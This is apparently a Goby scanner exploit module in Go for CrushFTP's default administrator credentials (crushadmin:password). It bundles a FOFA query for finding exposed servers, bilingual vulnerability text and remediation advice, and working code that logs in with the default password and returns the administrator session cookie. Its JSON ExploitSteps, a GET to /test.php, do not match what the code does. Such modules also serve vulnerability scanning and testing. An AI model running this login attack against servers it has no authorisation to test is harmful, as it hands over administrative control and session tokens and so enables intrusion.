package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CrushFTP default password vulnerability",
    "Description": "<p>CrushFTP is a commercial FTP server software available for operating systems such as Windows, macOS, and Linux.</p><p>CrushFTP has a default password vulnerability. An attacker can control the entire platform through the default password crushadmin:password and use administrator privileges to operate core functions.</p>",
    "Product": "crushftp",
    "Homepage": "https://www.crushftp.com/index.html",
    "DisclosureDate": "2023-10-05",
    "PostTime": "2023-10-07",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "server=\"CrushFTP\" || header=\"/WebInterface/login.html\" || banner=\"/WebInterface/login.html\" || header=\"/WebInterface/w3c/p3p.xml\" || banner=\"/WebInterface/w3c/p3p.xml\" || title=\"CrushFTP\"",
    "GobyQuery": "server=\"CrushFTP\" || header=\"/WebInterface/login.html\" || banner=\"/WebInterface/login.html\" || header=\"/WebInterface/w3c/p3p.xml\" || banner=\"/WebInterface/w3c/p3p.xml\" || title=\"CrushFTP\"",
    "Level": "2",
    "Impact": "<p>CrushFTP has a default password vulnerability. An attacker can control the entire platform through the default password crushadmin:password and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "CrushFTP 默认口令漏洞",
            "Product": "crushftp",
            "Description": "<p>CrushFTP 是一款商业化的 FTP 服务器软件，可用于 Windows、macOS 和 Linux 等操作系统。</p><p>CrushFTP 存在默认口令漏洞，攻击者可通过默认口令 crushadmin:password&nbsp;控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>CrushFTP 存在默认口令漏洞，攻击者可通过默认口令 crushadmin:password 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "CrushFTP default password vulnerability",
            "Product": "crushftp",
            "Description": "<p>CrushFTP is a commercial FTP server software available for operating systems such as Windows, macOS, and Linux.</p><p>CrushFTP has a default password vulnerability. An attacker can control the entire platform through the default password crushadmin:password and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>CrushFTP has a default password vulnerability. An attacker can control the entire platform through the default password crushadmin:password and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10887"
}`

	loginFlagP5acaUmK := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		loginRequestConfig := httpclient.NewPostRequestConfig(`/WebInterface/function/`)
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Header.Store(`Content-Type`, `application/x-www-form-urlencoded; charset=UTF-8`)
		loginRequestConfig.Header.Store(`X-Requested-With`, `XMLHttpRequest`)
		loginRequestConfig.Data = `command=login&username=crushadmin&password=password`
		return httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := loginFlagP5acaUmK(hostInfo)
			success := rsp != nil && strings.Contains(rsp.Utf8Html, `<loginResult>`) && strings.Contains(rsp.Utf8Html, `</loginResult>`) && strings.Contains(rsp.Utf8Html, `<response>success</response>`)
			if success {
				ss.VulURL = hostInfo.Scheme() + "://crushadmin:password@" + hostInfo.HostInfo
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				rsp, err := loginFlagP5acaUmK(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
				} else if rsp != nil && strings.Contains(rsp.Utf8Html, `<loginResult>`) && strings.Contains(rsp.Utf8Html, `</loginResult>`) && strings.Contains(rsp.Utf8Html, `<response>success</response>`) {
					expResult.Success = true
					expResult.Output = `Cookie: ` + rsp.Cookie
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
